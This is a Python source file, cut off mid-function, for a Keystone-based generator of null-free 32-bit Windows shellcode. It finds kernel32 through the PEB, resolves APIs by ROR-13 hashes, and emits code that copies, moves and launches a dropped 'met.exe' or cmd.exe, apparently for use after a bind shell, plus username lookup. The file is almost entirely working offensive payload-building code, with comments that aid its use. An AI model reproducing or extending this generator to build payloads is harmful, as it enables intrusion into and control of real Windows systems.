import sys
import os
from keystone import *
import struct

CSIDL_MAP = {
    "desktop": 0x10,
    "desktopdir": 0x10,
    "appdata": 0x1a,
    "common_appdata": 0x23,
    "startup": 0x07,
    "startmenu": 0x0b,
    "programs": 0x02,
    "favorites": 0x06,
    "fonts": 0x14,
    "templates": 0x15,
}

class ShellcodeGenerator:
    """
    A class to generate shellcode with inline explanations and comments.
    This class provides methods to create various shellcode operations including
    file operations, process creation, network operations, and user information retrieval.
    """
    def __init__(self):
        """
        Initialize the ShellcodeGenerator with empty code lists and default offsets.
        """
        self.code = []
        self.code_with_comments = []  
        self.func_offset = 0x10
        self.functions_added = []
        self.api_offsets = {}
        self.label_counter = 0
        self.ks = Ks(KS_ARCH_X86, KS_MODE_32)
        self.shellcode = []
    def add_line(self, line, explanation=""):
        """
        Add an assembly instruction line to the shellcode.
        
        Args:
            line (str): The assembly instruction to add
            explanation (str, optional): Explanation of what the instruction does
        """
        if '#' in line:
            line = line.split('#')[0].strip()
        if line:
            self.code.append(line)
            if explanation:
                self.code_with_comments.append((line, explanation))
            else:
                self.code_with_comments.append((line, ""))
    
    def add_comment(self, comment):
        """
        Add a comment line to the shellcode.
        
        Args:
            comment (str): The comment text to add
        """
        # Handle newlines - if comment starts with \n, add empty lines first
        leading_newlines = 0
        if comment.startswith("\n"):
            # Count leading newlines
            for char in comment:
                if char == "\n":
                    leading_newlines += 1
                else:
                    break
            
            # Remove leading newlines from comment text
            comment = comment.lstrip("\n")
        
        # Add empty comment lines for spacing (before the actual comment)
        for _ in range(leading_newlines):
            self.code.append("")
            self.code_with_comments.append(("", ""))
        
        if comment.strip():
            # Use # for all comments
            if comment.startswith("# "):
                # Already has #, use it as is
                comment_text = comment
            elif comment.startswith("#"):
                # Has # but no space, use as is
                comment_text = comment
            elif comment.startswith("##"):
                # Has ##, convert to single #
                comment_text = "#" + comment.lstrip("#")
            else:
                # No #, add single # 
                comment_text = f"# {comment}"
            self.code.append(comment_text)
            self.code_with_comments.append((comment_text, ""))
        elif comment == "" and leading_newlines == 0:
            # Empty comment - add empty line (only if no leading newlines already added)
            self.code.append("")
            self.code_with_comments.append(("", ""))
    
    def explain_instruction(self, instruction):
        """
        Generate an explanation for a given assembly instruction.
        
        Args:
            instruction (str): The assembly instruction to explain
            
        Returns:
            str: Explanation of what the instruction does
        """
        inst_lower = instruction.lower().strip()
        
        if ':' in inst_lower:
            return "Label definition"
        
        explanations = {
            'mov': self._explain_mov,
            'push': self._explain_push,
            'pop': self._explain_pop,
            'call': self._explain_call,
            'xor': self._explain_xor,
            'add': self._explain_add,
            'sub': "Subtract values",
            'inc': "Increment register by 1",
            'dec': "Decrement register by 1",
            'jmp': "Jump to label",
            'cmp': "Compare two values",
            'test': "Test register value",
            'lodsb': "Load byte from string",
            'ror': "Rotate right (hash calculation)",
            'cdq': "Convert doubleword to quadword",
            'cld': "Clear direction flag",
            'pushad': "Save all registers",
            'popad': "Restore all registers",
            'ret': "Return from function",
            'lea': "Load effective address",
            'neg': "Negate value (two's complement)",
        }
        
        for key, func in explanations.items():
            if key in inst_lower:
                if callable(func):
                    return func(inst_lower)
                return func
        
        if 'mov ax' in inst_lower or 'mov al' in inst_lower:
            return "Set lower byte/word of register"
        
        return "Execute instruction"
    
    def _explain_mov(self, instruction):
        """Explain MOV instruction based on context"""
        if '[ebp' in instruction or '[esp' in instruction:
            if 'eax' in instruction.split(',')[0]:
                return "Store value in memory location"
            else:
                return "Load value from memory location"
        elif 'esp' in instruction or 'ebp' in instruction:
            return "Set up stack/base pointer"
        else:
            return "Move data between registers"
    
    def _explain_push(self, instruction):
        """Explain PUSH instruction based on context"""
        if '0x' in instruction:
            return "Push value onto stack"
        else:
            return "Push register value onto stack"
    
    def _explain_pop(self, instruction):
        """Explain POP instruction"""
        return "Pop value from stack into register"
    
    def _explain_call(self, instruction):
        """Explain CALL instruction based on context"""
        if '[ebp' in instruction:
            return "Call function via stored address"
        else:
            return "Call function"
    
    def _explain_xor(self, instruction):
        """Explain XOR instruction based on context"""
        parts = instruction.split(',')
        if len(parts) == 2 and parts[0].strip() == parts[1].strip():
            return "Clear register (set to zero)"
        else:
            return "XOR operation"
    
    def _explain_add(self, instruction):
        """Explain ADD instruction based on context"""
        if '0xffff' in instruction:
            return "Adjust stack pointer (allocate space)"
        else:
            return "Add values"
    
    def ror_str(self, byte, count):
        """
        Rotate right using binary string manipulation.
        
        Args:
            byte (int): The value to rotate
            count (int): Number of positions to rotate
            
        Returns:
            int: The rotated value
        """
        binb = format(byte & 0xFFFFFFFF, '032b')
        while count > 0:
            binb = binb[-1] + binb[0:-1]
            count -= 1
        return int(binb, 2)
    
    def push_function_hash(self, function_name):
        """
        Calculate API hash using exact algorithm.
        
        Args:
            function_name (str): The API function name
            
        Returns:
            str: Assembly instruction to push the calculated hash
        """
        edx = 0x00
        ror_count = 0
        for eax in function_name:
            edx = edx + ord(eax)
            if ror_count < len(function_name) - 1:
                edx = self.ror_str(edx, 0xd)
            ror_count += 1
        return "push " + hex(edx & 0xFFFFFFFF)
    
    def calculate_api_hash(self, api_name):
        """
        Calculate the hash value for an API function.
        
        Args:
            api_name (str): The API function name
            
        Returns:
            int: The calculated hash value
        """
        hash_str = self.push_function_hash(api_name)
        hash_value = int(hash_str.split()[1], 16)
        return hash_value
    
    def build_string_no_nulls(self, string, dest_reg="ebx"):
        """
        Build a NULL-terminated string on the stack without NULL bytes in the code.
        
        Args:
            string (str): The string to build
            dest_reg (str): Register that will hold the pointer to the string
            
        Returns:
            list: List of tuples containing assembly instructions and explanations
        """
        lines = []
        
        byte_array = [ord(char) for char in string]
        byte_array.append(0x00)
        null_index = len(byte_array) - 1
        
        while len(byte_array) % 4 != 0:
            byte_array.append(0x41)
        
        dwords = []
        for i in range(0, len(byte_array), 4):
            dword = 0
            for j in range(4):
                byte_val = byte_array[i + j]
                if byte_val == 0x00:
                    byte_val = 0x01
                dword |= (byte_val << (8 * j))
            dwords.append(dword & 0xFFFFFFFF)
        
        # Push all dwords - each push builds part of the string
        for idx, dword in enumerate(reversed(dwords)):
            # Extract bytes from dword (little-endian: LSB first)
            ascii_str = ""
            for i in range(4):
                byte_val = (dword >> (i * 8)) & 0xFF
                # Skip padding (0x41) and NULL placeholder (0x01)
                if byte_val == 0x41 or byte_val == 0x01:
                    continue
                if byte_val == 0x00:
                    break
                if 32 <= byte_val <= 126:  # Printable ASCII
                    ascii_str += chr(byte_val)
                else:
                    # Non-printable byte found, stop
                    break
            
            # Format comment: show hex value and ASCII representation
            if ascii_str:
                comment = f"0x{dword:08x} = \"{ascii_str}\""
            else:
                comment = f"0x{dword:08x}"
            
            lines.append((f"push 0x{dword:08x}", comment))
        
        # Set pointer and NULL terminator
        lines.append((f"mov {dest_reg}, esp", f"Store string pointer in {dest_reg.upper()}"))
        lines.append(("xor eax, eax", ""))
        lines.append((f"mov byte ptr [{dest_reg} + {hex(null_index)}], al", "Write NULL terminator"))
        
        return lines
    
    def generate_base_shellcode(self):
        """
        Generate the base shellcode that finds kernel32.dll and sets up API resolution.
        This is the foundation that must be called before any other operations.
        """
        base_instructions = [
            ("start:", "Entry point label"),
            ("mov ebp, esp", "Save current stack pointer"),
            ("add esp, 0xfffff9f0", "Allocate stack space (avoid NULL bytes)"),
            ("find_kernel32:", "Label: Find kernel32.dll base address"),
            ("xor ecx, ecx", "Clear ECX register"),
            ("mov esi, fs:[ecx + 0x30]", "Get PEB address from TEB"),
            ("mov esi, [esi + 0x0c]", "Get PEB_LDR_DATA structure"),
            ("mov esi, [esi + 0x1c]", "Get InMemoryOrderModuleList"),
            ("next_module:", "Label: Check next module"),
              ("mov ebx, [esi + 0x8]", "Get module base address"),
              ("mov edi, [esi + 0x20]", "Get module name pointer"),
              ("mov esi, [esi]", "Move to next module in list"),
              ("cmp word ptr [edi + 24], cx", "Check if module name is 'kernel32.dll'"),
              ("jne next_module", "If not, check next module"),
              ("mov [ebp + 0x8], ebx", "Save kernel32 base for later"),
              ("find_function_shorten:", "Label: Function finder setup"),
            ("jmp find_function_shorten_bnc", "Jump to get return address"),
            ("find_function_ret:", "Label: Return address handler"),
            ("pop esi", "Get return address (function finder address)"),
            ("mov [ebp + 0x4], esi", "Store function finder address"),
            ("jmp resolve_symbols_kernel32", "Jump to API resolution"),
            ("find_function_shorten_bnc:", "Label: Get return address"),
            ("call find_function_ret", "Call to get return address on stack"),
            ("find_function:", "Label: Find function by hash"),
            ("pushad", "Save all general-purpose registers"),
            ("mov eax, [ebx + 0x3c]", "Get PE header offset (e_lfanew)"),
            ("mov edi, [ebx + eax + 0x78]", "Get Export Directory RVA"),
            ("add edi, ebx", "Convert RVA to absolute address"),
            ("mov ecx, [edi + 0x18]", "Get number of exported functions"),
            ("mov eax, [edi + 0x20]", "Get AddressOfNames RVA"),
            ("add eax, ebx", "Convert RVA to absolute address"),
            ("mov [ebp-4], eax", "Store AddressOfNames pointer"),
            ("find_function_loop:", "Label: Loop through function names"),
            ("jecxz find_function_finished", "Exit loop if no functions left"),
            ("dec ecx", "Decrement function counter"),
            ("mov eax, [ebp-4]", "Get AddressOfNames pointer"),
            ("mov esi, [eax + ecx*4]", "Get function name RVA"),
            ("add esi, ebx", "Convert RVA to absolute address"),
            ("compute_hash:", "Label: Compute function name hash"),
            ("xor eax, eax", "Clear EAX register"),
            ("cdq", "Clear EDX register (extend EAX sign)"),
            ("cld", "Clear direction flag (forward string operations)"),
            ("compute_hash_again:", "Label: Hash computation loop"),
            ("lodsb", "Load byte from string into AL"),
            ("test al, al", "Check if end of string (NULL terminator)"),
            ("jz compute_hash_finished", "If end of string, finish hashing"),
            ("ror edx, 0x0d", "Rotate hash right by 13 bits"),
            ("add edx, eax", "Add character value to hash"),
            ("jmp compute_hash_again", "Continue hashing next character"),
            ("compute_hash_finished:", "Label: Hash computation complete"),
            ("cmp edx, [esp + 0x24]", "Compare computed hash with target hash"),
            ("jnz find_function_loop", "If not match, try next function"),
            ("mov edx, [edi + 0x24]", "Get AddressOfNameOrdinals RVA"),
            ("add edx, ebx", "Convert RVA to absolute address"),
            ("mov cx, [edx + 2 * ecx]", "Get function ordinal"),
            ("mov edx, [edi + 0x1c]", "Get AddressOfFunctions RVA"),
            ("add edx, ebx", "Convert RVA to absolute address"),
            ("mov eax, [edx + 4 * ecx]", "Get function address RVA"),
            ("add eax, ebx", "Convert RVA to absolute address"),
            ("mov [esp + 0x1c], eax", "Store function address in saved EAX"),
            ("find_function_finished:", "Label: Function found or not found"),
            ("popad", "Restore all general-purpose registers"),
            ("ret", "Return to caller"),
            ("resolve_symbols_kernel32:", "Label: Resolve kernel32.dll APIs")
        ]
        
        for inst, expl in base_instructions:
            self.add_line(inst, expl)
    
    def add_api_resolution(self, api_name, desired_offset=None, api_description=None, parameters=None):
        """
        Add API resolution code for a specific function.
        
        Args:
            api_name (str): The API function name to resolve
            desired_offset (int, optional): Force a specific storage offset
            api_description (str, optional): Description of what the API does
            parameters (list, optional): List of parameter descriptions
              
        Returns:
            int: The offset where the API address is stored
        """
        if api_name in self.api_offsets:
            return self.api_offsets[api_name]

        hash_str = self.push_function_hash(api_name)
        hash_value = int(hash_str.split()[1], 16)
        offset = desired_offset if desired_offset is not None else self.func_offset
        
        # Add detailed API comment with C function signature
        self.add_comment("")
        self.add_comment(f"\n===== {api_name} =====")
        if api_name == "SHGetFolderPathA":
            self.add_comment("SHFOLDERAPI SHGetFolderPathA(")
            self.add_comment("  [in]  HWND   hwnd,")
            self.add_comment("  [in]  int    csidl,")
            self.add_comment("  [in]  HANDLE hToken,")
            self.add_comment("  [in]  DWORD  dwFlags,")
            self.add_comment("  [out] LPSTR  pszPath")
            self.add_comment(");")
        elif api_name == "URLDownloadToFileA":
            self.add_comment("HRESULT URLDownloadToFileA(")
            self.add_comment("  [in] LPUNKNOWN            pCaller,")
            self.add_comment("  [in] LPCSTR               szURL,")
            self.add_comment("  [in] LPCSTR               szFileName,")
            self.add_comment("  [in] DWORD                dwReserved,")
            self.add_comment("  [in] LPBINDSTATUSCALLBACK lpfnCB")
            self.add_comment(");")
        elif api_name == "WinExec":
            self.add_comment("UINT WinExec(")
            self.add_comment("  [in] LPCSTR lpCmdLine,")
            self.add_comment("  [in] UINT   uCmdShow")
            self.add_comment(");")
        elif api_name == "TerminateProcess":
            self.add_comment("BOOL TerminateProcess(")
            self.add_comment("  [in] HANDLE hProcess,")
            self.add_comment("  [in] UINT   uExitCode")
            self.add_comment(");")
        elif api_name == "LoadLibraryA":
            self.add_comment("HMODULE LoadLibraryA(")
            self.add_comment("  [in] LPCSTR lpLibFileName")
            self.add_comment(");")
        elif api_name == "CopyFileA":
            self.add_comment("BOOL CopyFileA(")
            self.add_comment("  [in] LPCSTR lpExistingFileName,")
            self.add_comment("  [in] LPCSTR lpNewFileName,")
            self.add_comment("  [in] BOOL   bFailIfExists")
            self.add_comment(");")
        elif api_name == "CopyFileExA":
            self.add_comment("BOOL CopyFileExA(")
            self.add_comment("  [in]           LPCSTR              lpExistingFileName,")
            self.add_comment("  [in]           LPCSTR              lpNewFileName,")
            self.add_comment("  [in, optional] LPPROGRESS_ROUTINE  lpProgressRoutine,")
            self.add_comment("  [in, optional] LPVOID              lpData,")
            self.add_comment("  [in, optional] LPBOOL              pbCancel,")
            self.add_comment("  [in]           DWORD               dwCopyFlags")
            self.add_comment(");")
        elif api_name == "MoveFileA":
            self.add_comment("BOOL MoveFileA(")
            self.add_comment("  [in] LPCSTR lpExistingFileName,")
            self.add_comment("  [in] LPCSTR lpNewFileName")
            self.add_comment(");")
        elif api_name == "CreateProcessA":
            self.add_comment("BOOL CreateProcessA(")
            self.add_comment("  [in, optional]     LPCSTR               lpApplicationName,")
            self.add_comment("  [in, out, optional] LPSTR                lpCommandLine,")
            self.add_comment("  [in, optional]     LPSECURITY_ATTRIBUTES lpProcessAttributes,")
            self.add_comment("  [in, optional]     LPSECURITY_ATTRIBUTES lpThreadAttributes,")
            self.add_comment("  [in]                BOOL                 bInheritHandles,")
            self.add_comment("  [in]                DWORD                dwCreationFlags,")
            self.add_comment("  [in, optional]     LPVOID               lpEnvironment,")
            self.add_comment("  [in, optional]     LPCSTR               lpCurrentDirectory,")
            self.add_comment("  [in]                LPSTARTUPINFOA       lpStartupInfo,")
            self.add_comment("  [out]               LPPROCESS_INFORMATION lpProcessInformation")
            self.add_comment(");")
        elif api_name == "GetUserNameA":
            self.add_comment("BOOL GetUserNameA(")
            self.add_comment("  [out] LPSTR  lpBuffer,")
            self.add_comment("  [in, out] LPDWORD lpnSize")
            self.add_comment(");")
        elif api_name == "GetUserProfileDirectoryA":
            self.add_comment("BOOL GetUserProfileDirectoryA(")
            self.add_comment("  [in]      HANDLE hToken,")
            self.add_comment("  [out]     LPSTR  lpProfileDir,")
            self.add_comment("  [in, out] LPDWORD lpcchSize")
            self.add_comment(");")
        elif api_name == "WaitForSingleObject":
            self.add_comment("DWORD WaitForSingleObject(")
            self.add_comment("  [in] HANDLE hHandle,")
            self.add_comment("  [in] DWORD  dwMilliseconds")
            self.add_comment(");")
        else:
            # Generic format for other APIs
            self.add_comment(f"{api_name}()")
        
        self.add_comment("")
        self.add_comment(f"Return: Stored at [EBP + {hex(offset)}]")
        self.add_comment("")
        
        # Resolve hash and API address
        self.add_comment(f"Resolving hash for {api_name}: {hex(hash_value)}")
        self.add_line(hash_str, f"Resolving hash for {api_name}")
        self.add_line("call dword ptr [ebp+0x4]", f"Call function finder to locate {api_name} address in loaded DLL using hash")
        self.add_line(f"mov [ebp + {hex(offset)}], eax", f"Store resolved {api_name} function pointer at [EBP + {hex(offset)}] for later use")
        
        self.functions_added.append((api_name, offset))
        self.api_offsets[api_name] = offset
        if desired_offset is None:
            self.func_offset += 0x4
        else:
            self.func_offset = max(self.func_offset, offset + 0x4)
        
        return offset
    
    def generate_copyfile(self, source, dest=None, use_dynamic_path=False, filename="met.exe", fail_if_exists=False):
        """
        Generate code to copy a file using CopyFileA.
        
        Args:
            source (str): Source file path
            dest (str, optional): Destination file path
            use_dynamic_path (bool): Use dynamic user path for destination
            filename (str): Filename to use with dynamic path
            fail_if_exists (bool): Whether to fail if destination exists
        """
        self.add_comment("")
        self.add_comment("# Copy file with CopyFileA")
        self.add_comment(f"# Source: {source}")
        
        if use_dynamic_path:
            self.add_comment(f"# Destination: C:\\Users\\{{user}}\\{filename}")
        else:
            self.add_comment(f"# Destination: {dest}")
            
        self.add_comment(f"# Fail if exists: {'Yes' if fail_if_exists else 'No'}")
        
        offset = self.add_api_resolution("CopyFileA")
        
        self.add_line("mov [ebp + 0x8], ebx", "Save kernel32 base - string building overwrites EBX")
        
        self.add_comment("")
        self.add_comment("# Build destination path")
        if use_dynamic_path:
            dest_reg = self.build_dynamic_user_path(filename)
            self.add_line(f"push {dest_reg}")
            self.add_line("pop edi", "EDI = destination path")
        else:
            for item in self.build_string_no_nulls(dest):
                self._process_string_item(item)
            self.add_line("mov edi, esp", "EDI = destination path")
        
        self.add_comment("")
        self.add_comment(f"# Build source path: {source}")
        for item in self.build_string_no_nulls(source):
            self._process_string_item(item)
        self.add_line("mov ebx, esp", "EBX = source path")
        
        self.add_comment("")
        self.add_comment("# Push parameters")
        if fail_if_exists:
            self.add_line("xor eax, eax")
            self.add_line("inc eax", "Set TRUE for bFailIfExists")
            self.add_line("push eax", "bFailIfExists = TRUE")
        else:
            self.add_line("xor eax, eax", "Set FALSE for bFailIfExists")
            self.add_line("push eax", "bFailIfExists = FALSE")
        
        self.add_line("push edi", "lpNewFileName (destination)")
        self.add_line("push ebx", "lpExistingFileName (source)")
        self.add_line(f"call [ebp + {hex(offset)}]", "Call CopyFileA")
        
        self.add_line("mov ebx, [ebp + 0x8]", "Restore kernel32 base")
        self.add_comment("# File copy operation completed")
    
    def generate_copyfileex(self, source, dest=None, use_dynamic_path=False, filename="met.exe",
                            copy_flags=0):
        """
        Generate code to copy a file using CopyFileExA (advanced version).
        
        Args:
            source (str): Source file path
            dest (str, optional): Destination file path
            use_dynamic_path (bool): Use dynamic user path for destination
            filename (str): Filename to use with dynamic path
            copy_flags (int): Copy flags for advanced operations
        """
        self.add_comment("")
        self.add_comment("# Copy file with CopyFileExA")
        self.add_comment(f"# Source: {source}")
        
        if use_dynamic_path:
            self.add_comment(f"# Destination: C:\\Users\\{{user}}\\{filename}")
        else:
            self.add_comment(f"# Destination: {dest}")
            
        self.add_comment("# Supports UNC paths and advanced flags")
        
        offset = self.add_api_resolution("CopyFileExA")
        
        self.add_line("mov [ebp + 0x8], ebx", "Save kernel32 base")
        self.add_line("mov [ebp + 0xc], esp", "Save ESP for cleanup")
        
        self.add_comment("")
        self.add_comment("# Build destination path")
        if use_dynamic_path:
            dest_reg = self.build_dynamic_user_path(filename)
            self.add_line(f"push {dest_reg}")
            self.add_line("pop edi", "EDI = destination path")
        else:
            for item in self.build_string_no_nulls(dest):
                self._process_string_item(item)
            self.add_line("mov edi, esp", "EDI = destination path")
        
        self.add_comment("")
        self.add_comment(f"# Build source path: {source}")
        for item in self.build_string_no_nulls(source):
            self._process_string_item(item)
        self.add_line("mov ebx, esp", "EBX = source path")
        
        self.add_comment("")
        self.add_comment("# Push parameters for CopyFileExA")
        self.add_comment("# Optional parameters set to NULL")
        
        if copy_flags == 0:
            self.add_line("xor eax, eax", "Set dwCopyFlags to 0")
            self.add_line("push eax", "dwCopyFlags = 0")
        else:
            self.add_line(f"push {hex(copy_flags)}", f"dwCopyFlags = {hex(copy_flags)}")
        
        self.add_line("xor eax, eax", "Clear EAX for NULL values")
        self.add_line("push eax", "pbCancel = NULL")
        self.add_line("push eax", "lpData = NULL")
        self.add_line("push eax", "lpProgressRoutine = NULL")
        self.add_line("push edi", "lpNewFileName (destination)")
        self.add_line("push ebx", "lpExistingFileName (source)")
        
        self.add_line(f"call [ebp + {hex(offset)}]", "Call CopyFileExA")
        
        self.add_line("mov esp, [ebp + 0xc]", "Cleanup stack")
        self.add_line("mov ebx, [ebp + 0x8]", "Restore kernel32 base")
    
    def generate_movefile(self, source, dest=None, use_dynamic_path=False, filename="met.exe"):
        """
        Generate code to move or rename a file using MoveFileA.
        
        Args:
            source (str): Source file path
            dest (str, optional): Destination file path
            use_dynamic_path (bool): Use dynamic user path for destination
            filename (str): Filename to use with dynamic path
        """
        self.add_comment("")
        self.add_comment("# Move or rename file with MoveFileA")
        self.add_comment(f"# Source: {source}")
        
        if use_dynamic_path:
            self.add_comment(f"# Destination: C:\\Users\\{{user}}\\{filename}")
        else:
            self.add_comment(f"# Destination: {dest}")
        
        offset = self.add_api_resolution("MoveFileA")
        
        self.add_line("mov [ebp + 0x8], ebx", "Save kernel32 base")
        self.add_line("mov [ebp + 0xc], esp", "Save ESP for cleanup")
        
        self.add_comment("")
        self.add_comment("# Build destination path")
        if use_dynamic_path:
            dest_reg = self.build_dynamic_user_path(filename)
            self.add_line(f"push {dest_reg}")
            self.add_line("pop edi", "EDI = destination")
        else:
            for item in self.build_string_no_nulls(dest):
                self._process_string_item(item)
            self.add_line("mov edi, esp", "EDI = destination")
        
        self.add_comment("")
        self.add_comment(f"# Build source path: {source}")
        for item in self.build_string_no_nulls(source):
            self._process_string_item(item)
        self.add_line("mov esi, esp", "ESI = source")
        
        self.add_comment("")
        self.add_comment("# Call MoveFileA")
        self.add_line("push edi", "lpNewFileName")
        self.add_line("push esi", "lpExistingFileName")
        self.add_line(f"call [ebp + {hex(offset)}]", "Move/rename file")
        
        self.add_line("mov esp, [ebp + 0xc]", "Cleanup stack")
        self.add_line("mov ebx, [ebp + 0x8]", "Restore kernel32 base")
        self.add_comment("# File move operation completed")
    
    def generate_createprocess(self, cmdline=None, use_dynamic_path=False, filename="met.exe"):
        """
        Generate code to launch a new process using CreateProcessA.
        
        Args:
            cmdline (str, optional): Command line to execute
            use_dynamic_path (bool): Use dynamic user path for executable
            filename (str): Filename to use with dynamic path
        """
        self.add_comment("")
        self.add_comment("# Launch process with CreateProcessA")
        
        if cmdline:
            self.add_comment(f"# Command: {cmdline}")
        elif use_dynamic_path:
            self.add_comment(f"# Dynamic path: C:\\Users\\{{user}}\\{filename}")
        
        self.add_comment("# If after bind shell: full interactive access via socket")
        
        offset = self.add_api_resolution("CreateProcessA")
        
        self.add_line("mov [ebp + 0x8], ebx", "Save kernel32 base")
        self.add_line("mov [ebp + 0xc], esp", "Save ESP for cleanup")
        
        self.add_comment("")
        self.add_comment("# Build command line")
        if use_dynamic_path:
            dest_reg = self.build_dynamic_user_path(filename)
            self.add_line(f"mov [ebp + 0x28], {dest_reg}", "Save pointer - STARTUPINFO will overwrite ESP")
        elif cmdline:
            if cmdline.lower() == "cmd.exe":
                self.add_comment("# Optimized cmd.exe construction")
                self.add_line("mov eax, 0xff9a879b")
                self.add_line("neg eax", "Becomes 'exe\\0'")
                self.add_line("push eax")
                self.add_line("push 0x2e646d63", "'cmd.'")
                self.add_line("push esp")
                self.add_line("pop ebx", "EBX = 'cmd.exe'")
            else:
                for item in self.build_string_no_nulls(cmdline):
                    self._process_string_item(item)
                self.add_line("mov ebx, esp", "EBX = command line")
        else:
            dest_reg = self.build_dynamic_user_path(filename)
            self.add_line(f"push {dest_reg}")
            self.add_line("pop ebx", "EBX = command line")
        
        self.add_comment("")
        self.add_comment("# Build STARTUPINFOA structure")
        self.add_line("xor esi, esi", "Zero ESI for NULL values")
        self.add_line("push esi", "hStdError")
        self.add_line("push esi", "hStdOutput")
        self.add_line("push esi", "hStdInput")
        self.add_line("xor eax, eax")
        self.add_line("push eax", "reserved")
        self.add_line("push eax", "wShowWindow")
        self.add_line("mov ax, 0x0101")
        self.add_line("dec eax", "EAX = 0x100 (STARTF_USESTDHANDLES)")
        self.add_line("push eax", "dwFlags = STARTF_USESTDHANDLES")
        self.add_line("xor eax, eax")
        
        for i in range(9):
            self.add_line("push eax", "Zero remaining fields")
        
        self.add_line("mov al, 0x44", "Size of STARTUPINFOA")
        self.add_line("push eax", "cb = 68")
        self.add_line("push esp")
        self.add_line("pop edi", "EDI = STARTUPINFOA pointer")
        
        if use_dynamic_path:
            self.add_line("mov ebx, [ebp + 0x28]", "Restore command line pointer")
        
        self.add_comment("")
        self.add_comment("# Allocate PROCESS_INFORMATION structure")
        self.add_line("mov edx, esp")
        self.add_line("mov eax, edx")
        self.add_line("xor ecx, ecx")
        self.add_line("mov cx, 0x390", "Size for PROCESS_INFORMATION")
        self.add_line("sub eax, ecx")
        self.add_line("push eax", "lpProcessInformation")
        
        self.add_comment("")
        self.add_comment("# Call CreateProcessA")
        self.add_line("push edi", "lpStartupInfo")
        self.add_line("xor eax, eax", "Clear EAX for NULL parameters")
        self.add_line("push eax", "lpCurrentDirectory = NULL")
        self.add_line("push eax", "lpEnvironment = NULL")
        self.add_line("push eax", "dwCreationFlags = 0")
        self.add_line("inc eax", "Set bInheritHandles = TRUE")
        self.add_line("push eax", "bInheritHandles = TRUE")
        self.add_line("dec eax", "EAX = 0")
        self.add_line("push eax", "dwCreationFlags again")
        self.add_line("push eax", "lpEnvironment again")
        self.add_line("push ebx", "lpCommandLine")
        self.add_line("push eax", "lpApplicationName = NULL")
        self.add_line(f"call [ebp + {hex(offset)}]", "Launch process")
        
        self.add_line("mov esp, [ebp + 0xc]", "Cleanup stack")
        self.add_line("mov ebx, [ebp + 0x8]", "Restore kernel32 base")
        self.add_comment("# Process launched successfully")
    
    def generate_terminate(self, exit_code=0):
        """
        Generate code to terminate the current process.
        
        Args:
            exit_code (int): Exit code to return (default 0)
        """
        self.add_comment("")
        self.add_comment("# Terminate current process")
        
        offset = self.add_api_resolution("TerminateProcess")
        
        self.add_comment("# Setup exit code")
        if exit_code == 0:
            self.add_line("xor eax, eax", "Fast zero for exit code")
        elif exit_code <= 0xFF:
            self.add_line("xor eax, eax")
            self.add_line(f"mov al, {hex(exit_code)}", f"Low byte = {exit_code}")
        else:
            self.add_line(f"push {hex(exit_code)}", f"Push exit code {exit_code}")
            self.add_line("xor eax, eax")
            self.add_line("dec eax", "EAX = -1 (current process)")
            self.add_line("push eax", "hProcess = -1")
            self.add_line(f"call [ebp + {hex(offset)}]", "Terminate process")
            return
        
        self.add_line("push eax", "Push exit code")
        self.add_line("xor eax, eax")
        self.add_line("dec eax", "EAX = -1 (current process)")
        self.add_line("push eax", "hProcess = -1")
        self.add_line(f"call [ebp + {hex(offset)}]", "Call TerminateProcess")
        self.add_comment("# Execution ends here")

    def generate_getusername(self, buffer_size=256):
        """
        Generate code to retrieve the current username.
        
        Args:
            buffer_size (int): Size of buffer for username (default 256)
        """
        self.add_comment("")
        self.add_comment("# Retrieve current username")
        self.add_comment("# Useful for building user-specific paths")
        
        loadlibrary_offset = self._ensure_api_available("LoadLibraryA")
        
        self.add_line("mov [ebp + 0x8], ebx", "Save kernel32 base")
        
        self.add_comment("")
        self.add_comment("# Load advapi32.dll")
        self.add_line("xor eax, eax")
        self.add_line("push eax", "NULL terminator")
        self.add_line("push 0x6c6c642e", "'.dll'")
        self.add_line("push 0x32336970", "'pi32'")
        self.add_line("push 0x61766461", "'adva'")
        self.add_line("mov esi, esp", "ESI = 'advapi32.dll'")
        self.add_line("push esi", "Push DLL name pointer")
        self.add_line(f"call [ebp + {hex(loadlibrary_offset)}]", "Load advapi32.dll")
        self.add_line("add esp, 0x14", "Cleanup stack")
        
        self.add_line("mov ebx, eax", "EBX = advapi32.dll base")
        
        self.add_comment("")
        self.add_comment("# Resolve GetUserNameA")
        hash_str = self.push_function_hash("GetUserNameA")
        username_offset = self.func_offset
        
        self.add_line(hash_str)
        self.add_line("call dword ptr [ebp + 0x04]", "Call function finder")
        self.add_line(f"mov [ebp + {hex(username_offset)}], eax", "Store GetUserNameA address")
        
        self.functions_added.append(("GetUserNameA", username_offset))
        self.func_offset += 0x4
        
        self.add_line("mov ebx, [ebp + 0x8]", "Restore kernel32 base")
        
        self.add_comment("")
        self.add_comment("# Call GetUserNameA")
        # FIXED: Use proper technique to avoid null bytes
        if buffer_size == 256:
            self.add_line("xor eax, eax")
            self.add_line("mov ah, 0x1", "AH = 1, so EAX = 0x100 (256)")
        else:
            # For other buffer sizes, calculate proper values
            if buffer_size <= 0xFF:
                self.add_line("xor eax, eax")
                self.add_line(f"mov al, {hex(buffer_size)}")
            elif buffer_size <= 0xFFFF:
                self.add_line("xor eax, eax")
                self.add_line(f"mov ax, {hex(buffer_size)}")
            else:
                self.add_line(f"mov eax, {hex(buffer_size)}")
        
        # Store buffer size in memory first, then pass pointer
        self.add_line("mov [ebp - 0xc], eax", "Store buffer size")
        self.add_line("lea ecx, [ebp - 0xc]", "ECX = pointer to size variable")
        self.add_line("push ecx", "lpcchBuffer (in/out)")
        self.add_line("lea eax, [ebp + 0x24]", "Buffer for username")
        self.add_line("push eax", "lpBuffer")
        self.add_line(f"call [ebp + {hex(username_offset)}]", "Call GetUserNameA")
        
        self.add_comment("")
        self.add_comment("# Save username length (excluding NULL)")
        self.add_line("mov ecx, [ebp - 0xc]", "Get returned length")
        self.add_line("dec ecx", "Exclude NULL terminator")
        self.add_line("mov [ebp - 0x8], ecx", "Store clean length")
        self.add_comment("# Username retrieved successfully")

    def generate_getuserprofiledir(self, buffer_size=256):
        """
        Generate code to retrieve the current user's profile directory.
        
        Args:
            buffer_size (int): Size of buffer for profile path (default 256)
        """
        self.add_comment("")
        self.add_comment("# Get user profile directory")
        self.add_comment("# Path stored at [ebp + 0x40]")
        
        self.add_line("mov [ebp + 0x8], ebx", "Save kernel32 base")
        
        self.add_comment("")
        self.generate_loadlibrary("Userenv.dll")
        
        self.add_comment("")
        self.add_comment("# Resolve GetUserProfileDirectoryA")
        hash_str = self.push_function_hash("GetUserProfileDirectoryA")
        profile_offset = self.func_offset
        
